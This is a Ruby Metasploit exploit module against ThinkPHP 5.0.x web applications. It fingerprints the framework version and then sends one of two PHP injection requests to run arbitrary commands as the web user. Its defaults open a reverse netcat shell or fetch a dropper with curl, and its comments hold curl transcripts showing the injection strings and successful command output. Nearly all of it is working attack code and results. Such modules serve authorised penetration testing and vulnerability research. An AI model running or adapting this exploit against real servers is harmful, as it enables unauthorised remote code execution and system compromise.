# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;                    => &#039;ThinkPHP Multiple PHP Injection RCEs&#039;,
      &#039;Description&#039;             => %q{
        This module exploits one of two PHP injection vulnerabilities in the
        ThinkPHP web framework to execute code as the web user.

        Versions up to and including 5.0.23 are exploitable, though 5.0.23 is
        vulnerable to a separate vulnerability. The module will automatically
        attempt to detect the version of the software.

        Tested against versions 5.0.20 and 5.0.23 as can be found on Vulhub.
      },
      &#039;Author&#039;                  => [
        # Discovery by unknown threaty threat actors
        &#039;wvu&#039; # Module
      ],
      &#039;References&#039;              => [
        # https://www.google.com/search?q=thinkphp+rce, tbh
        [&#039;CVE&#039;, &#039;2018-20062&#039;], # NoneCMS 1.3 using ThinkPHP
        [&#039;CVE&#039;, &#039;2019-9082&#039;],  # Open Source BMS 1.1.1 using ThinkPHP
        [&#039;URL&#039;, &#039;https://github.com/vulhub/vulhub/tree/master/thinkphp/5-rce&#039;],
        [&#039;URL&#039;, &#039;https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce&#039;]
      ],
      &#039;DisclosureDate&#039;          => &#039;2018-12-10&#039;, # Unknown discovery date
      &#039;License&#039;                 => MSF_LICENSE,
      &#039;Platform&#039;                => [&#039;unix&#039;, &#039;linux&#039;],
      &#039;Arch&#039;                    => [ARCH_CMD, ARCH_X86, ARCH_X64],
      &#039;Privileged&#039;              => false,
      &#039;Targets&#039;                 => [
        [&#039;Unix Command&#039;,
          &#039;Platform&#039;            => &#039;unix&#039;,
          &#039;Arch&#039;                => ARCH_CMD,
          &#039;Type&#039;                => :unix_cmd,
          &#039;DefaultOptions&#039;      => {&#039;PAYLOAD&#039; => &#039;cmd/unix/reverse_netcat&#039;}
        ],
        [&#039;Linux Dropper&#039;,
          &#039;Platform&#039;            => &#039;linux&#039;,
          &#039;Arch&#039;                => [ARCH_X86, ARCH_X64],
          &#039;Type&#039;                => :linux_dropper,
          &#039;DefaultOptions&#039;      => {
            &#039;CMDSTAGER::FLAVOR&#039; => :curl,
          }
        ]
      ],
      &#039;DefaultTarget&#039;           => 1,
      &#039;Notes&#039;                   => {
        &#039;Stability&#039;             => [CRASH_SAFE],
        &#039;Reliability&#039;           => [REPEATABLE_SESSION],
        &#039;SideEffects&#039;           => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
      }
    ))

    register_options([
      Opt::RPORT(8080),
      OptString.new(&#039;TARGETURI&#039;, [true, &#039;Base path&#039;, &#039;/&#039;])
    ])

    register_advanced_options([
      # NOTE: You may want to tweak this for long-running commands like find(1)
      OptFloat.new(&#039;CmdOutputTimeout&#039;,
                   [true, &#039;Timeout for cmd/unix/generic output&#039;, 3.5])
    ])

    # XXX: https://github.com/rapid7/metasploit-framework/issues/12963
    import_target_defaults
  end

=begin
  wvu@kharak:~$ curl -vs "http://127.0.0.1:8080/index.php?s=$((RANDOM))" | xmllint --html --xpath &#039;substring-after(//div[@class = "copyright"]/span[1]/text(), "V")&#039; -
  *   Trying 127.0.0.1...
  * TCP_NODELAY set
  * Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)
  > GET /index.php?s=1353 HTTP/1.1
  > Host: 127.0.0.1:8080
  > User-Agent: curl/7.54.0
  > Accept: */*
  >
  < HTTP/1.1 404 Not Found
  < Date: Mon, 13 Apr 2020 06:42:15 GMT
  < Server: Apache/2.4.25 (Debian)
  < X-Powered-By: PHP/7.2.5
  < Content-Length: 7332
  < Content-Type: text/html; charset=utf-8
  <
  { [7332 bytes data]
  * Connection #0 to host 127.0.0.1 left intact
  5.0.20wvu@kharak:~$
=end
  def check
    # An unknown route will trigger the ThinkPHP copyright with version
    res = send_request_cgi(
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, &#039;index.php&#039;),
      &#039;vars_get&#039; => {&#039;s&#039; => rand_text_alpha(8..42)}
    )

    unless res
      return CheckCode::Unknown(&#039;Target did not respond to check request.&#039;)
    end

    unless res.code == 404 && res.body.match(/copyright.*ThinkPHP/m)
      return CheckCode::Unknown(
        &#039;Target did not respond with ThinkPHP copyright.&#039;
      )
    end

    # Get the first copyright <span> containing the version
    version = res.get_html_document.at(&#039;//div[@class = "copyright"]/span&#039;)&.text

    unless (version = version.scan(/^V([\d.]+)$/).flatten.first)
      return CheckCode::Detected(
        &#039;Target did not respond with ThinkPHP version.&#039;
      )
    end

    # Make the parsed version a comparable ivar for automatic exploitation
    @version = Gem::Version.new(version)

    if @version <= Gem::Version.new(&#039;5.0.23&#039;)
      return CheckCode::Appears("ThinkPHP #{@version} is a vulnerable version.")
    end

    CheckCode::Safe("ThinkPHP #{@version} is NOT a vulnerable version.")
  end

  def exploit
    # NOTE: Automatic check is implemented by the AutoCheck mixin
    super

    # This is just extra insurance in case I screwed up the check method
    unless @version
      fail_with(Failure::NoTarget, &#039;Could not detect ThinkPHP version&#039;)
    end

    print_status("Targeting ThinkPHP #{@version} automatically")

    case target[&#039;Type&#039;]
    when :unix_cmd
      execute_command(payload.encoded)
    when :linux_dropper
      # XXX: Only opts[:noconcat] may induce responses from the server
      execute_cmdstager
    else # This is just extra insurance in case I screwed up the info hash
      fail_with(Failure::NoTarget, "Could not select target #{target[&#039;Type&#039;]}")
    end
  end

  def execute_command(cmd, _opts = {})
    vprint_status("Executing command: #{cmd}")

    if @version < Gem::Version.new(&#039;5.0.23&#039;)
      exploit_less_than_5_0_23(cmd)
    elsif @version == Gem::Version.new(&#039;5.0.23&#039;)
      exploit_5_0_23(cmd)
    else # This is just extra insurance in case I screwed up the exploit method
      fail_with(Failure::NoTarget, "Could not target ThinkPHP #{@version}")
    end
  end

=begin
  wvu@kharak:~$ curl -gvs "http://127.0.0.1:8080/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id" | head -1
  *   Trying 127.0.0.1...
  * TCP_NODELAY set
  * Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)
  > GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id HTTP/1.1
  > Host: 127.0.0.1:8080
  > User-Agent: curl/7.54.0
  > Accept: */*
  >
  < HTTP/1.1 200 OK
  < Date: Mon, 13 Apr 2020 06:43:45 GMT
  < Server: Apache/2.4.25 (Debian)
  < X-Powered-By: PHP/7.2.5
  < Vary: Accept-Encoding
  < Transfer-Encoding: chunked
  < Content-Type: text/html; charset=UTF-8
  <
  { [60 bytes data]
  * Connection #0 to host 127.0.0.1 left intact
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  wvu@kharak:~$
=end
  def exploit_less_than_5_0_23(cmd)
    # XXX: The server may block on executing our payload and won&#039;t respond
    res = send_request_cgi({
      &#039;method&#039;      => &#039;GET&#039;,
      &#039;uri&#039;         => normalize_uri(target_uri.path, &#039;index.php&#039;),
      &#039;vars_get&#039;    => {
        &#039;s&#039;         => &#039;/Index/\\think\\app/invokefunction&#039;,
        &#039;function&#039;  => &#039;call_user_func_array&#039;,
        &#039;vars[0]&#039;   => &#039;system&#039;, # TODO: Debug ARCH_PHP
        &#039;vars[1][]&#039; => cmd
      },
      &#039;partial&#039;     => true
    }, datastore[&#039;CmdOutputTimeout&#039;])

    return unless res && res.code == 200

    vprint_good("Successfully executed command: #{cmd}")

    return unless datastore[&#039;PAYLOAD&#039;] == &#039;cmd/unix/generic&#039;

    # HACK: Print half of the doubled-up command output
    vprint_line(res.body[0, res.body.length / 2])
  end

=begin
  wvu@kharak:~$ curl -vsd "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id" http://127.0.0.1:8081/index.php?s=captcha | head -1
  *   Trying 127.0.0.1...
  * TCP_NODELAY set
  * Connected to 127.0.0.1 (127.0.0.1) port 8081 (#0)
  > POST /index.php?s=captcha HTTP/1.1
  > Host: 127.0.0.1:8081
  > User-Agent: curl/7.54.0
  > Accept: */*
  > Content-Length: 72
  > Content-Type: application/x-www-form-urlencoded
  >
  } [72 bytes data]
  * upload completely sent off: 72 out of 72 bytes
  < HTTP/1.1 200 OK
  < Date: Mon, 13 Apr 2020 06:44:05 GMT
  < Server: Apache/2.4.25 (Debian)
  < X-Powered-By: PHP/7.2.12
  < Vary: Accept-Encoding
  < Transfer-Encoding: chunked
  < Content-Type: text/html; charset=UTF-8
  <
  { [60 bytes data]
  * Connection #0 to host 127.0.0.1 left intact
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  wvu@kharak:~$
=end
  def exploit_5_0_23(cmd)
    # XXX: The server may block on executing our payload and won&#039;t respond
    res = send_request_cgi({
      &#039;method&#039;                   => &#039;POST&#039;,
      &#039;uri&#039;                      => normalize_uri(target_uri.path, &#039;index.php&#039;),
      &#039;vars_get&#039;                 => {&#039;s&#039; => &#039;captcha&#039;},
      &#039;vars_post&#039;                => {
        &#039;_method&#039;                => &#039;__construct&#039;,
        &#039;filter[]&#039;               => &#039;system&#039;, # TODO: Debug ARCH_PHP
        &#039;method&#039;                 => &#039;get&#039;,
        &#039;server[REQUEST_METHOD]&#039; => cmd
      },
      &#039;partial&#039;                  => true
    }, datastore[&#039;CmdOutputTimeout&#039;])

    return unless res && res.code == 200

    vprint_good("Successfully executed command: #{cmd}")

    return unless datastore[&#039;PAYLOAD&#039;] == &#039;cmd/unix/generic&#039;

    # Clean up output from cmd/unix/generic
    vprint_line(res.body.gsub(/\n<!DOCTYPE html>.*/m, &#039;&#039;))
  end

end

